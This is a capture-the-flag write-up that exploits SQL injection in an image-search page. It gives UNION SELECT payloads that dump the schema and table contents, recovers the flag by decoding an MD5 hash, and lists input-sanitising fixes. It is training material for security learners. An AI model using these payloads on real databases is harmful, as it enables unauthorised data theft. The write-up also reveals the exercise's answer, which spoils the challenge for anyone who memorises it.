Preview :
This page ask the user to use an id to search an image on the database. We can see an sql injection attack if we try to fill something like "1 or 1=1" because the server dump all the images.

Steps :
Firstly, we need to dump all the columns and the tables name to see what we can do to find the flag.

--> 1 UNION SELECT column_name, table_name from information_schema.columns#

We obtain all the tables and all the columns of each tables.

The list_images table have some interesting columns:
- id
- url
- title
- comment

Dump the columns *Comment* and *title*:

--> 1 UNION SELECT comment, title from list_images#

Result:

ID: 1 UNION SELECT comment, title from list_images#
Title: Hack me ?
Url : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46

- step1 -> go to http://md5decrypt.net/#answer and decrypt `1928e8083cf461a51303633093573c46` to albatroz
- step2 -> sha256 him with http://md5decrypt.net/Sha256/

Fix :
- locked the variable recovered with the \_GET method betwen 2 quote.
- use a function to escape special character like quote, NULL, \\n, \\r etc...
- use the functions like `isnumeric()` to be sure we have recovered a numerical value.
